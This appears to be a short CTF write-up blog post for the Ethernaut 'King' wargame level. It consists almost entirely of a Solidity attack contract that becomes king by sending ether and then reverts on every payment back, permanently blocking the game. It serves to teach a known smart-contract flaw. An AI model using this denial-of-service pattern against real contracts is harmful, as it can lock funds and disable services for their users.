+++
title = 'Ethernaut Level 9 - King'
date = 2024-08-28T16:14:08+02:00
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Stay King forever by refusing money'
tags = [ 'writeups' , 'blockchain' ]
+++

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

interface King {}

// https://www.youtube.com/watch?v=5kNONlpJdDk
// http://www.kingoftheether.com/postmortem.html
contract Attack {
    King etherGame;

    constructor(King _etherGame) payable  {
        // Send enough eth to become king
        (bool success, bytes memory data) = address(_etherGame).call{value:1000000000000001}("");
        require(success);
    }

    // Refuse to receive Eth to DOS
    receive() external payable {
        assert(false);
    }
}
```